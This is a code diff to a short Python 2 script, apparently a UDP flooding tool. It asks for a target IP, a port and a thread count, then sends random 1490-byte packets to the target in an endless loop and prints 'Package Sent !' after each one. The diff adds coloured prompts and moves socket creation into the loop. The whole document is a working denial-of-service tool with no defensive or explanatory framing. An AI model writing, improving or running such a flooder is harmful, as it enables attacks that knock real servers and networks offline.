@@ -5,22 +5,20 @@ import socket
 import random
 import threading
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
 os.system("clear")
-print
-print
-ip = raw_input("IP : ")
-port = input("Port : ")
-thread_num = input("Threads : ")
+print (" ")
+ip = raw_input("\033[93m [+] IP : \033[1m")
+port = input("\033[94m [+] Port : \033[1m")
+thread_num = input("\033[95m [+] Threads : \033[1m")
+print (" ")
+print "\033[91m [!] Please Wait While Packages Are Preparing Thread : \033[1m",thread_num
+time.sleep(5)
 
 def run():
 	bytes = random._urandom(1490)
 	while True:
 		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			s.connect((str(ip),int(port))) 
 			s.send(bytes)
 			print "\033[92m [+] Package Sent ! \033[0m"
